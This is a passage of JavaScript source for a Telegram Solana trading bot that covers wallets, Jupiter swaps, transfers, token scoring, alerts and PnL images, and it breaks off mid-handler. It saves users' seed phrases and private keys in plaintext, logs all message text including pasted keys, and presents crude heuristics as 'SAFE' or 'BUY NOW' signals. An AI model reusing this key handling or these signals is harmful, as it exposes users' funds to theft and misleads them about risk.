// ============================================
// PEGASUS TRADING BOT - Complete Implementation
// Jupiter V6 + Multi-Wallet + File Persistence
// + Tracked Tokens + Alerts + PNL Images + Full Menus
// ============================================
// PEGASUS TRADING BOT - Complete Implementation
// with Debug Logging
// ============================================
import { Telegraf, Markup } from 'telegraf';
import {
  Connection,
  Keypair,
  PublicKey,
  LAMPORTS_PER_SOL,
  VersionedTransaction,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount
} from '@solana/spl-token';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import 'dotenv/config';
import fs from 'fs/promises';
import path from 'path';
import { createCanvas, loadImage, registerFont } from 'canvas';
import QRCode from 'qrcode';
import { fileURLToPath } from 'url';

// ======================= CONFIGURATION =======================
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const BOT_NAME = 'Pegasus Trading Bot';

// Register custom fonts (optional)
const FONT_DIR = __dirname;
try {
  registerFont(path.join(FONT_DIR, 'Orbitron-ExtraBold.ttf'), { family: 'OrbitronExtraBold' });
  registerFont(path.join(FONT_DIR, 'Orbitron-SemiBold.ttf'),  { family: 'OrbitronSemiBold' });
  registerFont(path.join(FONT_DIR, 'Orbitron-Regular.ttf'),    { family: 'OrbitronRegular' });
} catch (e) { /* fonts not found – fallback to default */ }

const FONT_BIG_SIZE   = 95;
const FONT_MID_SIZE   = 42;
const FONT_SMALL_SIZE = 28;

const GOOD_BG = path.join(__dirname, 'good.png');
const BAD_BG  = path.join(__dirname, 'bad.png');
const SOLANA_LOGO = path.join(__dirname, 'solana-logo.png');

// Persistent storage (override via env for Railway volumes)
const SESSIONS_FILE = process.env.SESSIONS_PATH || path.join(__dirname, 'sessions.json');

// ======================= CACHE & RPC =======================
const balanceCache = new Map();
const BALANCE_CACHE_TTL = 30000;

let solPriceCache = { price: 0, timestamp: 0 };
const PRICE_CACHE_TTL = 60000;

const RPC_ENDPOINTS = [
  process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://rpc.ankr.com/solana',
  'https://solana.public-rpc.com'
];

async function getBalanceWithFallback(publicKeyString) {
  const cacheKey = publicKeyString.toString();
  const now = Date.now();
  const cached = balanceCache.get(cacheKey);
  if (cached && (now - cached.timestamp < BALANCE_CACHE_TTL)) return cached.balance;
  for (const endpoint of RPC_ENDPOINTS) {
    try {
      const tempConnection = new Connection(endpoint, 'confirmed');
      const publicKey = new PublicKey(publicKeyString);
      const balance = await Promise.race([
        tempConnection.getBalance(publicKey),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000))
      ]);
      const solBalance = balance / LAMPORTS_PER_SOL;
      balanceCache.set(cacheKey, { balance: solBalance, timestamp: now });
      return solBalance;
    } catch (error) { continue; }
  }
  if (cached) return cached.balance;
  throw new Error('All RPC endpoints failed');
}

async function getSolPriceWithCache() {
  const now = Date.now();
  if (solPriceCache.price > 0 && (now - solPriceCache.timestamp < PRICE_CACHE_TTL)) return solPriceCache.price;
  try {
    const res = await fetch('https://api.dexscreener.com/latest/dex/tokens/So11111111111111111111111111111111111111112');
    const data = await res.json();
    if (data.pairs && data.pairs.length) {
      const solPair = data.pairs.find(p => p.chainId === 'solana' && (p.quoteToken?.symbol === 'USDC' || p.quoteToken?.symbol === 'USDT'));
      if (solPair && solPair.priceUsd) {
        const price = parseFloat(solPair.priceUsd);
        solPriceCache = { price, timestamp: now };
        return price;
      }
    }
    const cg = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const cgData = await cg.json();
    if (cgData?.solana?.usd) {
      const price = cgData.solana.usd;
      solPriceCache = { price, timestamp: now };
      return price;
    }
    throw new Error('No price');
  } catch (error) {
    if (solPriceCache.price > 0) return solPriceCache.price;
    return 0;
  }
}

// ======================= CONFIG =======================
const BOT_TOKEN = process.env.BOT_TOKEN;
const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const MAX_ADMINS = 2;
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || process.env.ADMIN_CHAT_ID || '')
  .split(',').map(id => id.trim()).filter(id => id.length > 0).slice(0, MAX_ADMINS);

const JUPITER_API = 'https://api.jup.ag/swap/v1';
const JUPITER_API_KEY = process.env.JUPITER_API_KEY || '';
const SOL_MINT = 'So11111111111111111111111111111111111111112';
const MAX_WALLETS = 5;
const MAX_TRACKED_TOKENS = 5;
const MAX_ALERTS = 3;

const COMMISSION_WALLET = process.env.COMMISSION_WALLET || '';
const COMMISSION_PERCENTAGE = parseFloat(process.env.COMMISSION_PERCENTAGE || '0');
const COMMISSION_BPS = Math.floor(COMMISSION_PERCENTAGE * 100);

const bot = new Telegraf(BOT_TOKEN);
const connection = new Connection(SOLANA_RPC, 'confirmed');

// ======================= DEBUG LOGGING =======================
bot.use(async (ctx, next) => {
  console.log('Update:', ctx.updateType);
  if (ctx.message) console.log('Message:', ctx.message.text);
  await next();
});

// ======================= SESSION MANAGEMENT =======================
const userSessions = new Map();

function serializeSession(session) {
  return {
    ...session,
    wallets: session.wallets.map(w => ({ mnemonic: w.mnemonic, publicKey: w.publicKey, privateKey: w.privateKey }))
  };
}

function deserializeSession(data) {
  const session = { ...data };
  session.wallets = session.wallets.map(w => {
    if (w.mnemonic) {
      const wallet = importFromMnemonic(w.mnemonic);
      return { keypair: wallet.keypair, mnemonic: wallet.mnemonic, publicKey: wallet.publicKey, privateKey: wallet.privateKey };
    } else if (w.privateKey) {
      const wallet = importFromPrivateKey(w.privateKey);
      return { keypair: wallet.keypair, mnemonic: null, publicKey: wallet.publicKey, privateKey: wallet.privateKey };
    }
    return null;
  }).filter(w => w !== null);
  return session;
}

async function loadSessions() {
  try {
    const data = await fs.readFile(SESSIONS_FILE, 'utf-8');
    const obj = JSON.parse(data);
    for (const [uid, sd] of Object.entries(obj)) {
      userSessions.set(parseInt(uid), deserializeSession(sd));
    }
    // Rebuild referral map
    for (const [uid, sess] of userSessions.entries()) {
      if (sess.referralCode) referralCodes.set(sess.referralCode, uid);
    }
    console.log(`✅ Loaded ${userSessions.size} sessions`);
  } catch (err) {
    if (err.code !== 'ENOENT') console.error('Load sessions error:', err);
    else console.log('No existing sessions file, starting fresh.');
  }
}

async function saveSessions() {
  try {
    const obj = {};
    for (const [uid, sess] of userSessions.entries()) obj[uid] = serializeSession(sess);
    await fs.writeFile(SESSIONS_FILE, JSON.stringify(obj, null, 2), 'utf-8');
    console.log(`✅ Saved ${userSessions.size} sessions`);
  } catch (err) { console.error('Save sessions error:', err); }
}

function getSession(userId) {
  if (!userSessions.has(userId)) {
    userSessions.set(userId, {
      wallets: [], activeWalletIndex: 0, state: null,
      settings: { slippage: 1, priorityFee: 0.001, autoBuy: false, notifications: true },
      pendingTrade: null, limitOrders: [], copyTradeWallets: [],
      trackedTokens: [], alerts: [], dcaOrders: [],
      isNewUser: true, referralCode: null, referredBy: null, referrals: [], referralEarnings: 0,
      pendingTransfer: null, tradeHistory: [],
      dailyStats: { date: new Date().toDateString(), totalTrades: 0, profitableTrades: 0, lossTrades: 0, totalPnl: 0 },
      pendingAlertToken: null, pendingAlert: null
    });
  }
  return userSessions.get(userId);
}

function getActiveWallet(session) {
  if (session.wallets.length === 0) return null;
  return session.wallets[session.activeWalletIndex] || session.wallets[0];
}

// ======================= WALLET FUNCTIONS =======================
function createWallet() {
  const mnemonic = bip39.generateMnemonic();
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  return { keypair, mnemonic, publicKey: keypair.publicKey.toBase58(), privateKey: bs58.encode(keypair.secretKey) };
}

function importFromMnemonic(mnemonic) {
  if (!bip39.validateMnemonic(mnemonic)) throw new Error('Invalid mnemonic');
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  return { keypair, mnemonic, publicKey: keypair.publicKey.toBase58(), privateKey: bs58.encode(keypair.secretKey) };
}

function importFromPrivateKey(privateKeyBase58) {
  const secretKey = bs58.decode(privateKeyBase58);
  const keypair = Keypair.fromSecretKey(secretKey);
  return { keypair, mnemonic: null, publicKey: keypair.publicKey.toBase58(), privateKey: privateKeyBase58 };
}

async function getBalance(publicKey) {
  try { return (await connection.getBalance(new PublicKey(publicKey))) / LAMPORTS_PER_SOL; } catch { return 0; }
}

async function getTokenBalance(walletAddress, tokenMint) {
  try {
    const wallet = new PublicKey(walletAddress);
    const mint = new PublicKey(tokenMint);
    const accounts = await connection.getParsedTokenAccountsByOwner(wallet, { mint });
    if (accounts.value.length > 0) {
      const bal = accounts.value[0].account.data.parsed.info.tokenAmount;
      return { amount: parseFloat(bal.uiAmount), decimals: bal.decimals };
    }
    return { amount: 0, decimals: 9 };
  } catch { return { amount: 0, decimals: 9 }; }
}

// ======================= TRANSFER =======================
async function transferSOL(fromWallet, toAddress, amount) {
  if (!fromWallet?.keypair) throw new Error('Source wallet not available');
  if (!isSolanaAddress(toAddress)) throw new Error('Invalid recipient');
  if (amount <= 0) throw new Error('Invalid amount');
  const toPubkey = new PublicKey(toAddress);
  const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
  const balance = await connection.getBalance(fromWallet.keypair.publicKey);
  if (balance < lamports + 0.005 * LAMPORTS_PER_SOL) throw new Error('Insufficient balance');
  const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: fromWallet.keypair.publicKey, toPubkey: toPubkey, lamports }));
  return await sendAndConfirmTransaction(connection, tx, [fromWallet.keypair], { commitment: 'confirmed' });
}

async function transferToken(fromWallet, toAddress, tokenMint, amount) {
  if (!fromWallet?.keypair) throw new Error('Source wallet not available');
  if (!isSolanaAddress(toAddress) || !isSolanaAddress(tokenMint)) throw new Error('Invalid address');
  const mintPubkey = new PublicKey(tokenMint);
  const fromPubkey = fromWallet.keypair.publicKey;
  const toPubkey = new PublicKey(toAddress);
  const fromATA = await getAssociatedTokenAddress(mintPubkey, fromPubkey);
  const toATA = await getAssociatedTokenAddress(mintPubkey, toPubkey);
  const tx = new Transaction();
  let exists = false;
  try { await getAccount(connection, toATA); exists = true; } catch { exists = false; }
  if (!exists) tx.add(createAssociatedTokenAccountInstruction(fromPubkey, toATA, toPubkey, mintPubkey));
  const tokenInfo = await getTokenBalance(fromPubkey.toBase58(), tokenMint);
  const decimals = tokenInfo.decimals || 9;
  const tokenAmount = Math.floor(amount * Math.pow(10, decimals));
  tx.add(createTransferInstruction(fromATA, toATA, fromPubkey, tokenAmount));
  return await sendAndConfirmTransaction(connection, tx, [fromWallet.keypair], { commitment: 'confirmed' });
}

// ======================= JUPITER SWAP =======================
async function getJupiterQuote(inputMint, outputMint, amount, slippageBps = 100, commissionBps = 0) {
  if (!inputMint || !outputMint) throw new Error('Invalid mint');
  if (!amount || amount <= 0) throw new Error('Invalid amount');
  const validSlippage = Math.max(1, Math.min(Math.floor(slippageBps), 10000));
  const params = new URLSearchParams({
    inputMint, outputMint, amount: amount.toString(),
    slippageBps: validSlippage.toString(),
    onlyDirectRoutes: 'false', asLegacyTransaction: 'false', maxAccounts: '64'
  });
  if (commissionBps > 0) params.append('platformFeeBps', commissionBps.toString());
  const url = `${JUPITER_API}/quote?${params.toString()}`;
  const res = await fetch(url, { headers: JUPITER_API_KEY ? { 'x-api-key': JUPITER_API_KEY } : {} });
  if (!res.ok) throw new Error(`Jupiter API error: ${res.status}`);
  const data = await res.json();
  if (data.error) throw new Error(data.error);
  if (!data.inAmount || !data.outAmount) throw new Error('Invalid quote response');
  return data;
}

async function executeJupiterSwap(quote, wallet, priorityFee = 0.001, commissionBps = 0, commissionWallet = null) {
  if (!wallet?.keypair) throw new Error('Invalid wallet');
  const priorityFeeLamports = Math.floor(Math.max(0.0001, Math.min(priorityFee, 0.1)) * LAMPORTS_PER_SOL);
  const body = {
    quoteResponse: quote,
    userPublicKey: wallet.publicKey,
    wrapAndUnwrapSol: true,
    dynamicComputeUnitLimit: true,
    prioritizationFeeLamports: priorityFeeLamports
  };
  if (commissionBps > 0 && commissionWallet && isSolanaAddress(commissionWallet)) body.feeAccount = commissionWallet;
  const res = await fetch(`${JUPITER_API}/swap`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...(JUPITER_API_KEY ? { 'x-api-key': JUPITER_API_KEY } : {}) },
    body: JSON.stringify(body)
  });
  if (!res.ok) throw new Error(`Swap API error: ${res.status}`);
  const swapData = await res.json();
  if (swapData.error) throw new Error(swapData.error);
  if (!swapData.swapTransaction) throw new Error('No swap transaction');
  const txBuf = Buffer.from(swapData.swapTransaction, 'base64');
  const tx = VersionedTransaction.deserialize(txBuf);
  tx.sign([wallet.keypair]);
  const txid = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: false, preflightCommitment: 'confirmed', maxRetries: 3 });
  const conf = await connection.confirmTransaction(txid, 'confirmed');
  if (conf.value?.err) throw new Error('Transaction failed on-chain');
  return { success: true, txid, inputAmount: quote.inAmount, outputAmount: quote.outAmount };
}

// ======================= TOKEN ANALYSIS =======================
async function fetchTokenData(address) {
  try {
    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    const data = await res.json();
    if (!data.pairs?.length) return null;
    const pair = data.pairs.filter(p => p.chainId === 'solana').sort((a,b) => (b.liquidity?.usd||0) - (a.liquidity?.usd||0))[0];
    return pair;
  } catch { return null; }
}

function calculateSecurityScore(pair) {
  let score = 50;
  const warnings = [], positives = [];
  const liq = pair.liquidity?.usd || 0;
  if (liq > 100000) { score += 20; positives.push('✅ Strong liquidity'); }
  else if (liq > 50000) { score += 10; positives.push('✅ Good liquidity'); }
  else if (liq < 10000) { score -= 20; warnings.push('⚠️ Low liquidity'); }
  const vol = pair.volume?.h24 || 0;
  if (vol > 100000) { score += 10; positives.push('✅ High volume'); }
  else if (vol < 5000) { score -= 10; warnings.push('⚠️ Low volume'); }
  const change24 = pair.priceChange?.h24 || 0;
  if (change24 < -50) { score -= 25; warnings.push('🚨 RUG ALERT: Major dump'); }
  else if (change24 < -30) { score -= 15; warnings.push('⚠️ Significant drop'); }
  else if (change24 > 20) positives.push('📈 Strong momentum');
  const age = Date.now() - (pair.pairCreatedAt || Date.now());
  const days = age / (1000*3600*24);
  if (days < 1) { score -= 15; warnings.push('⚠️ New token (<24h)'); }
  else if (days > 7) { score += 10; positives.push('✅ Established pool'); }
  const volLiq = vol / (liq || 1);
  if (volLiq > 2) positives.push('✅ Healthy vol/liq');
  else if (volLiq < 0.1) warnings.push('⚠️ Low activity');
  return { score: Math.max(0, Math.min(100, score)), warnings, positives };
}

function generateScoreBar(score) {
  const filled = Math.round(score / 10);
  return `[${'█'.repeat(filled)}${'░'.repeat(10-filled)}]`;
}

function getSecurityRating(score) {
  if (score >= 80) return { emoji: '🟢', text: 'SAFE', advice: 'Low risk entry' };
  if (score >= 60) return { emoji: '🟡', text: 'MODERATE', advice: 'Proceed with caution' };
  if (score >= 40) return { emoji: '🟠', text: 'RISKY', advice: 'Small position only' };
  return { emoji: '🔴', text: 'DANGER', advice: 'Avoid' };
}

function calculateTradingSignals(pair, score) {
  const price = parseFloat(pair.priceUsd) || 0;
  const change1h = pair.priceChange?.h1 || 0;
  const change24 = pair.priceChange?.h24 || 0;
  let entry = { emoji: '⏳', text: 'WAIT', reason: '' };
  let tp = 0, sl = 0;
  if (score >= 70) {
    if (change1h < -5 && change24 > 0) { entry = { emoji: '🟢', text: 'BUY NOW', reason: 'Dip in uptrend' }; tp = 25; sl = 10; }
    else if (change1h >= 0 && change1h < 10 && change24 >= 0) { entry = { emoji: '🟢', text: 'GOOD ENTRY', reason: 'Stable momentum' }; tp = 20; sl = 12; }
    else if (change1h > 20) { entry = { emoji: '🟡', text: 'WAIT', reason: 'Overextended' }; tp = 15; sl = 15; }
    else { entry = { emoji: '🟢', text: 'FAVORABLE', reason: 'Good fundamentals' }; tp = 20; sl = 12; }
  } else if (score >= 50) {
    if (change1h < -10) { entry = { emoji: '🟡', text: 'RISKY DIP', reason: 'Catching knife' }; tp = 30; sl = 15; }
    else if (change24 > 50) { entry = { emoji: '🔴', text: 'AVOID', reason: 'Overheated' }; tp = 0; sl = 0; }
    else { entry = { emoji: '🟡', text: 'CAUTION', reason: 'Moderate risk' }; tp = 25; sl = 15; }
  } else {
    if (change24 < -30) entry = { emoji: '🔴', text: 'AVOID', reason: 'Possible rug' };
    else { entry = { emoji: '🔴', text: 'HIGH RISK', reason: 'Poor fundamentals' }; tp = 40; sl = 20; }
  }
  return { entry, takeProfit: { percent: tp, price: price * (1 + tp/100) }, stopLoss: { percent: sl, price: price * (1 - sl/100) } };
}

function getMarketTrend(change24) {
  if (change24 > 50) return 'PUMPING 🚀';
  if (change24 > 20) return 'BULLISH 📈';
  if (change24 > 5) return 'UPTREND ↗️';
  if (change24 > -5) return 'CONSOLIDATING ➡️';
  if (change24 > -20) return 'DOWNTREND ↘️';
  if (change24 > -50) return 'BEARISH 📉';
  return 'CRASHING 💥';
}

async function getSolPrice() {
  try {
    const res = await fetch('https://api.dexscreener.com/latest/dex/tokens/So11111111111111111111111111111111111111112');
    const data = await res.json();
    const solPair = data.pairs?.find(p => p.chainId === 'solana' && (p.quoteToken?.symbol === 'USDC' || p.quoteToken?.symbol === 'USDT'));
    if (solPair?.priceUsd) return parseFloat(solPair.priceUsd);
    const cg = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const cgData = await cg.json();
    return cgData?.solana?.usd || 0;
  } catch { return 0; }
}

function formatTokenPrice(price) {
  if (!price) return '0.00000';
  const p = parseFloat(price);
  if (p < 0.01) return p.toFixed(5);
  if (p < 1) return p.toFixed(4);
  if (p < 1000) return p.toFixed(2);
  return p.toLocaleString('en-US', { maxFractionDigits: 2 });
}

// ======================= RECORD TRADE =======================
function recordTrade(userId, tradeData) {
  const session = getSession(userId);
  const record = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2),
    timestamp: new Date().toISOString(),
    date: new Date().toDateString(),
    time: new Date().toLocaleTimeString(),
    ...tradeData
  };
  session.tradeHistory.unshift(record);
  if (session.tradeHistory.length > 100) session.tradeHistory = session.tradeHistory.slice(0, 100);
  const today = new Date().toDateString();
  if (!session.dailyStats || session.dailyStats.date !== today) session.dailyStats = { date: today, totalTrades: 0, profitableTrades: 0, lossTrades: 0, totalPnl: 0 };
  session.dailyStats.totalTrades++;
  if (record.pnlUsd > 0) { session.dailyStats.profitableTrades++; session.dailyStats.totalPnl += record.pnlUsd; }
  else if (record.pnlUsd < 0) { session.dailyStats.lossTrades++; session.dailyStats.totalPnl += record.pnlUsd; }
  saveSessions();
  return record;
}

// ======================= PNL IMAGE =======================
async function generatePnLImage(data) {
  const { pnlPercent, pair, time, invested, current, tagline, qrData, username, solanaLogoPath = SOLANA_LOGO } = data;
  const isProfit = pnlPercent >= 0;
  const bgPath = isProfit ? GOOD_BG : BAD_BG;
  const glowColor = isProfit ? { r: 0, g: 255, b: 150 } : { r: 255, g: 60, b: 60 };
  const pnlText = isProfit ? `+${pnlPercent.toFixed(2)}%` : `${pnlPercent.toFixed(2)}%`;

  let bgImage;
  try { bgImage = await loadImage(bgPath); } catch { bgImage = null; }
  const canvas = createCanvas(bgImage ? bgImage.width : 1200, bgImage ? bgImage.height : 800);
  const ctx = canvas.getContext('2d');
  if (bgImage) ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
  else {
    const grad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
    grad.addColorStop(0, '#0a0a1a'); grad.addColorStop(1, '#101020');
    ctx.fillStyle = grad; ctx.fillRect(0, 0, canvas.width, canvas.height);
  }

  function drawGlowText(x, y, text, fontFamily, fontSize, color) {
    ctx.font = `${fontSize}px "${fontFamily}"`;
    ctx.textAlign = 'left'; ctx.textBaseline = 'top';
    for (let off = 1; off <= 5; off++) {
      ctx.fillStyle = `rgb(${color.r}, ${color.g}, ${color.b})`;
      ctx.fillText(text, x - off, y); ctx.fillText(text, x + off, y);
      ctx.fillText(text, x, y - off); ctx.fillText(text, x, y + off);
    }
    ctx.fillStyle = 'white';
    ctx.fillText(text, x, y);
  }

  const x = Math.floor(canvas.width * 0.55);
  const yStart = 60;
  ctx.font = `${FONT_MID_SIZE}px "OrbitronSemiBold"`;
  ctx.fillStyle = 'rgb(200,200,200)';
  ctx.fillText(pair, x, yStart);
  drawGlowText(x, yStart + 70, pnlText, 'OrbitronExtraBold', FONT_BIG_SIZE, glowColor);
  ctx.font = `${FONT_SMALL_SIZE}px "OrbitronRegular"`;
  ctx.fillStyle = 'rgb(150,150,150)';
  ctx.fillText(`Time: ${time}`, x, yStart + 190);
  ctx.fillStyle = 'rgb(120,120,120)';
  ctx.fillText('Invested', x, yStart + 260);
  ctx.fillStyle = 'white';
  ctx.fillText(invested, x, yStart + 300);
  ctx.fillStyle = 'rgb(120,120,120)';
  ctx.fillText('Current Value', x, yStart + 360);
  ctx.fillStyle = 'white';
  ctx.fillText(current, x, yStart + 400);
  ctx.fillStyle = 'white';
  ctx.fillText(tagline, x, canvas.height - 80);

  if (qrData) {
    const qrSize = 150;
    const qrX = 30, qrY = canvas.height - qrSize - 30;
    try {
      const qrBuf = await QRCode.toBuffer(qrData, { width: qrSize, margin: 1 });
      const qrImg = await loadImage(qrBuf);
      ctx.drawImage(qrImg, qrX, qrY, qrSize, qrSize);
      ctx.font = `${FONT_SMALL_SIZE}px "OrbitronRegular"`;
      ctx.fillStyle = 'white';
      ctx.fillText(`@${username}`, qrX + qrSize + 15, qrY + qrSize/2 + 8);
    } catch (e) { console.warn('QR error', e); }
  }

  try {
    const logo = await loadImage(solanaLogoPath);
    const logoSize = 35;
    ctx.drawImage(logo, x - logoSize - 10, yStart + 295, logoSize, logoSize);
    ctx.drawImage(logo, x - logoSize - 10, yStart + 395, logoSize, logoSize);
  } catch { /* no logo */ }

  ctx.font = `${FONT_SMALL_SIZE - 5}px "OrbitronRegular"`;
  ctx.fillStyle = 'rgba(255,255,255,0.5)';
  ctx.textAlign = 'right';
  ctx.fillText(BOT_NAME, canvas.width - 20, canvas.height - 20);
  ctx.textAlign = 'left';
  return canvas.toBuffer('image/jpeg', { quality: 0.95 });
}

// ======================= PNL IMAGE ACTIONS =======================
bot.action(/^pnl_image_token_(.+)$/, async (ctx) => {
  const token = ctx.match[1];
  await ctx.answerCbQuery('📸 Generating...');
  const session = getSession(ctx.from.id);
  const wallet = getActiveWallet(session);
  if (!wallet) return ctx.reply('❌ No wallet');
  const bal = await getTokenBalance(wallet.publicKey, token);
  if (bal.amount <= 0) return ctx.reply('❌ No token balance');
  const pair = await fetchTokenData(token);
  if (!pair) return ctx.reply('❌ Could not fetch price');
  const price = parseFloat(pair.priceUsd) || 0;
  const solPrice = await getSolPrice();
  const tokenSymbol = pair.baseToken?.symbol || '???';
  const buys = session.tradeHistory.filter(t => t.tokenAddress === token && t.type === 'BUY');
  if (!buys.length) return ctx.reply('❌ No buy history');
  let totalSpentSol = 0, totalBought = 0;
  for (const t of buys) { totalSpentSol += t.amountSol; totalBought += t.amountToken; }
  const investedSol = totalSpentSol;
  const investedUsd = investedSol * (buys[0]?.priceUsd || 0);
  const currentValueSol = bal.amount * (solPrice / price);
  const currentValueUsd = bal.amount * price;
  const pnlUsd = currentValueUsd - investedUsd;
  const pnlPercent = investedUsd ? (pnlUsd / investedUsd) * 100 : 0;
  const firstDate = new Date(buys[buys.length-1].timestamp);
  const diffHours = (Date.now() - firstDate) / (1000*3600);
  const timeStr = diffHours < 24 ? `${diffHours.toFixed(1)}h` : `${(diffHours/24).toFixed(1)}d`;
  const referralCode = getReferralCode(ctx.from.id);
  const botUser = (await bot.telegram.getMe()).username;
  const qr = `https://t.me/${botUser}?start=ref_${referralCode}`;
  const img = await generatePnLImage({
    pnlPercent, pair: `${tokenSymbol}/SOL`, time: timeStr,
    invested: `${investedSol.toFixed(4)} SOL ($${investedUsd.toFixed(2)})`,
    current: `${currentValueSol.toFixed(4)} SOL ($${currentValueUsd.toFixed(2)})`,
    tagline: `PEGASUS • ${tokenSymbol} POSITION`,
    qrData: qr, username: ctx.from.username || ctx.from.first_name || 'user'
  });
  await ctx.replyWithPhoto({ source: img }, { caption: `📊 PNL: ${pnlPercent>=0?'+':''}${pnlPercent.toFixed(2)}%` });
});

bot.action('pnl_image_overall', async (ctx) => {
  await ctx.answerCbQuery('📸 Generating overall...');
  const session = getSession(ctx.from.id);
  const history = session.tradeHistory || [];
  if (!history.length) return ctx.reply('❌ No trades');
  const spentSol = history.filter(t => t.type === 'BUY').reduce((s,t)=>s+t.amountSol,0);
  const spentUsd = history.filter(t => t.type === 'BUY').reduce((s,t)=>s+t.valueUsd,0);
  const recvSol = history.filter(t => t.type === 'SELL').reduce((s,t)=>s+t.amountSol,0);
  const recvUsd = history.filter(t => t.type === 'SELL').reduce((s,t)=>s+t.valueUsd,0);
  const pnlUsd = recvUsd - spentUsd;
  const pnlPercent = spentUsd ? (pnlUsd / spentUsd) * 100 : 0;
  const timeStr = `${Math.round((Date.now() - new Date(history[history.length-1].timestamp)) / (1000*3600))}h`;
  const referralCode = getReferralCode(ctx.from.id);
  const botUser = (await bot.telegram.getMe()).username;
  const qr = `https://t.me/${botUser}?start=ref_${referralCode}`;
  const img = await generatePnLImage({
    pnlPercent, pair: 'PEGASUS/TRADES', time: timeStr,
    invested: `${spentSol.toFixed(4)} SOL ($${spentUsd.toFixed(2)})`,
    current: `${recvSol.toFixed(4)} SOL ($${recvUsd.toFixed(2)})`,
    tagline: 'PEGASUS • OVERALL PERFORMANCE',
    qrData: qr, username: ctx.from.username || ctx.from.first_name || 'user'
  });
  await ctx.replyWithPhoto({ source: img }, { caption: `📊 Overall PNL: ${pnlPercent>=0?'+':''}${pnlPercent.toFixed(2)}%` });
});

// ======================= TRACK & ALERTS =======================
bot.action(/^track_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  const session = getSession(ctx.from.id);
  const tracked = session.trackedTokens || [];
  if (tracked.some(t => t.address === address)) return ctx.answerCbQuery('Already tracked');
  if (tracked.length >= MAX_TRACKED_TOKENS) return ctx.answerCbQuery(`Max ${MAX_TRACKED_TOKENS} tracked tokens`, true);
  const pair = await fetchTokenData(address);
  const currentPrice = pair ? parseFloat(pair.priceUsd) : 0;
  tracked.push({ address, trackedPrice: currentPrice, last2xAlert: null, lastSignalAlert: null });
  saveSessions();
  await ctx.answerCbQuery('✅ Token tracked!');
});

bot.action('menu_tracked', async (ctx) => {
  const session = getSession(ctx.from.id);
  const tracked = session.trackedTokens || [];
  if (!tracked.length) return ctx.editMessageText('📭 No tracked tokens.\n\nPaste a token and click "📍 Track".', { ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'back_main')]]) });
  let text = '⭐ *Your Tracked Tokens*\n\n';
  for (let i=0; i<tracked.length; i++) text += `${i+1}. \`${shortenAddress(tracked[i].address)}\`\n`;
  const buttons = [];
  for (let i=0; i<tracked.length; i++) {
    buttons.push([
      Markup.button.callback(`🔍 ${i+1}`, `tracked_analyze_${i}`),
      Markup.button.callback(`❌`, `tracked_remove_${i}`),
      Markup.button.callback(`🔔`, `tracked_alert_${i}`)
    ]);
  }
  buttons.push([Markup.button.callback('« Back', 'back_main')]);
  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/^tracked_analyze_(\d+)$/, async (ctx) => {
  const idx = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  const tracked = session.trackedTokens || [];
  if (idx>=0 && idx<tracked.length) await sendTokenAnalysis(ctx, tracked[idx].address);
  else await ctx.answerCbQuery('Invalid token');
});

bot.action(/^tracked_remove_(\d+)$/, async (ctx) => {
  const idx = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  const tracked = session.trackedTokens || [];
  if (idx>=0 && idx<tracked.length) {
    const removed = tracked.splice(idx,1)[0];
    session.alerts = (session.alerts || []).filter(a => a.token !== removed.address);
    saveSessions();
    await ctx.answerCbQuery(`Removed ${shortenAddress(removed.address)}`);
    await ctx.editMessageText(`✅ Removed tracked token.`, { ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'menu_tracked')]]) });
  }
});

bot.action(/^tracked_alert_(\d+)$/, async (ctx) => {
  const idx = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  const tracked = session.trackedTokens || [];
  if (idx>=0 && idx<tracked.length) {
    session.pendingAlertToken = tracked[idx].address;
    session.state = 'AWAITING_ALERT_TYPE';
    await ctx.editMessageText(`🔔 Set alert for \`${shortenAddress(tracked[idx].address)}\`\n\nChoose type:`, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💰 Price', 'alert_type_price')],
        [Markup.button.callback('📈 24h % Change', 'alert_type_percent')],
        [Markup.button.callback('📊 Market Cap', 'alert_type_mcap')],
        [Markup.button.callback('Cancel', 'menu_tracked')]
      ])
    });
  }
});

bot.action('alert_type_price', async (ctx) => {
  const session = getSession(ctx.from.id);
  session.pendingAlert = { type: 'price' };
  session.state = 'AWAITING_ALERT_THRESHOLD';
  await ctx.editMessageText('Enter target price in USD (e.g., 0.001):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_tracked')]]) });
});
bot.action('alert_type_percent', async (ctx) => {
  const session = getSession(ctx.from.id);
